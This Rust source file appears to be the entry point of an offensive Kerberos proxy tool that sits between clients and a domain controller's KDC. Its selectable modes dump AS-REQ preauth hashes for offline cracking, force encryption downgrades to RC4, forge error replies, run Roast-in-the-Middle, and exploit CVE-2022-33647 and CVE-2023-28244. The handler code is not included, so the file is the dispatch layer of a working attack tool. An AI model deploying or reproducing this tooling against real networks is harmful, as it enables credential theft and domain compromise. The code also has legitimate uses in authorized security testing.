use std::{io, net::SocketAddr, path::PathBuf};

use clap::{Parser, ValueEnum};
use kdc_proxy::{
    handler::{
        Cve202233647Handler, Cve202328244Handler, DowngradePaHandler, ForgeErrorHandler,
        IdentityHandler, RitmHandler, RoastActiveHandler, RoastPassiveHandler,
    },
    KdcProxy,
};
use rasn::types::SequenceOf;
use rasn_kerberos::{KerberosString, PrincipalName};

#[derive(Debug, Parser)]
struct Args {
    #[arg(short, long, value_enum, default_value_t = Default::default())]
    mode: HandlerMode,

    #[arg(long, allow_hyphen_values = true, required_if_eq("mode", "downgrade"))]
    etype: Option<i32>,

    #[arg(
        long,
        allow_hyphen_values = true,
        required_if_eq("mode", "test-error-code")
    )]
    error_code: Option<i32>,

    /// Service Principal Name (slash-delimited, ex. "krbtgt/WINDOMAIN.LOCAL")
    #[arg(long, required_if_eq("mode", "ritm"))]
    spn: Option<String>,

    /// Output directory path
    #[arg(short, long, required_if_eq("mode", "cve-2023-28244"))]
    output_dir: Option<PathBuf>,

    /// Socket address (IP:PORT) for local listener (ex. 0.0.0.0:88)
    listen_addr: SocketAddr,

    /// Socket address (IP:PORT) of remote KDC
    remote_addr: SocketAddr,
}

#[derive(Clone, Debug, Default, ValueEnum)]
enum HandlerMode {
    #[default]
    LogOnly,

    #[clap(help = "Dump hashes for AS-REQ preauth")]
    RoastPassive,

    #[clap(help = "Attempt downgrade of AS-REQ preauth to RC4 and dump hashes")]
    RoastActive,

    #[clap(help = "Attempt downgrade of AS-REQ preauth to provided <ETYPE> value")]
    DowngradePa,

    #[clap(
        name = "forge-error",
        help = "Reply to AS-REQ with a KRB-ERROR using provided <ERROR_CODE> value"
    )]
    ForgeError,

    #[clap(help = "Attempt Roast-in-the-Middle attack using provided <SPN> value")]
    Ritm,

    #[clap(
        name = "cve-2022-33647",
        help = "Attempt CVE-2022-33647 downgrade of TGT session key"
    )]
    Cve202233647,

    #[clap(
        name = "cve-2023-28244",
        help = "Attempt CVE-2023-28244 downgrade of AS-REQ preauth"
    )]
    Cve202328244,
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let args = Args::parse();
    tracing_subscriber::fmt::init();
    match args.mode {
        HandlerMode::LogOnly => {
            KdcProxy::listen(args.listen_addr, args.remote_addr, IdentityHandler {}).await?;
        }
        HandlerMode::RoastPassive => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                RoastPassiveHandler::new(),
            )
            .await?;
        }
        HandlerMode::RoastActive => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                RoastActiveHandler::new(),
            )
            .await?;
        }
        HandlerMode::DowngradePa => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                DowngradePaHandler::new(args.etype.unwrap()),
            )
            .await?;
        }
        HandlerMode::ForgeError => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                ForgeErrorHandler::new(args.error_code.unwrap()),
            )
            .await?;
        }
        HandlerMode::Ritm => {
            let spn: SequenceOf<KerberosString> = args
                .spn
                .unwrap()
                .split("/")
                .map(|i| i.to_owned().into())
                .collect();
            let spn = PrincipalName {
                r#type: 2,
                string: spn,
            };
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                RitmHandler::new(args.remote_addr, spn),
            )
            .await?;
        }
        HandlerMode::Cve202233647 => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                Cve202233647Handler::new(),
            )
            .await?;
        }
        HandlerMode::Cve202328244 => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                Cve202328244Handler::new(args.remote_addr, args.output_dir.unwrap()),
            )
            .await?;
        }
    };
    Ok(())
}

// fn parse_etype(src: &str) -> Result<i8, std::num::ParseIntError> {
//     if src.starts_with("0x") {
//         let etype = u8::from_str_radix(src, 16)?;
//         Ok(etype as i8)
//     } else {
//         let etype = i8::from_str_radix(src, 10)?;
//         Ok(etype)
//     }
// }
